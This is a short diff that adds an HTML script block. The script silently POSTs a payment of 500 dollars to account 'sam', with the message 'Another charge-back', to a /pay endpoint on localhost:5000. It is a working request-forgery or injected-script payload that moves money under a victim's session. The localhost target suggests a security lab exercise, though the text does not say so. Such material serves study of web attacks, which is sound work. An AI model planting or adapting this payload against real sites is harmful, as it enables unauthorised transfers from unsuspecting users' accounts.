@@ -1,0 +1,14 @@
+    <script>
+      var x = new XMLHttpRequest();
+      var e = encodeURIComponent;
+      var data = [];
+      data.push(e('account') + '=' + e('sam'));
+      data.push(e('dollars') + '=' + e('500'));
+      data.push(e('message') + '=' + e('Another charge-back'));
+      data = data.join('&');
+      x.open('POST', 'http://localhost:5000/pay');
+      x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      //x.setRequestHeader('Content-Length', data.length);
+      console.log(data);
+      x.send(data);
+    </script>
